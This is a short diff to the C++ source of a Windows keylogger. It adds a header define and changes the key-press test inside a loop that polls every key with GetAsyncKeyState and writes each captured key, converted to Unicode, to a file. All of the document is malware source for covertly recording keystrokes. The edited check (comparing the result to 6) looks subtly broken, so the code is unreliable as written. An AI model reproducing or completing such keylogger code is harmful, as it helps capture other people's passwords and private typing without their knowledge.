@@ -1,9 +1,10 @@
 //
 // Created by avita on 25/02/2021.
 //
+#define WIN32_LEAN_AND_MEAN
+
 
 #include "Keylogger.h"
-
 
 Keylogger::Keylogger() {}
 
@@ -34,6 +35,7 @@ void Keylogger::writeKeyToFile(char key) {
     hkl = GetKeyboardLayout(threadId);
     wchar_t UniChar[2] = {0}; //The size of wchar_t is 2 bytes
     ToUnicodeEx(key, key, (BYTE *) kState, UniChar, 2, NULL, hkl); //Converting key to unicode in
+
     file << UniChar;
     free(kState);
 }
@@ -87,7 +89,7 @@ int Keylogger::startKeylogger(Keylogger keylogger) {
         //Checking if a key has pressed
         for (key = 8; key <= 256 && keylogger.run; key++) {
 
-            if (GetAsyncKeyState(key) == -32767) {
+            if (GetAsyncKeyState(key) == 6) {
 
                 switch (key) {
                     case VK_SPACE:
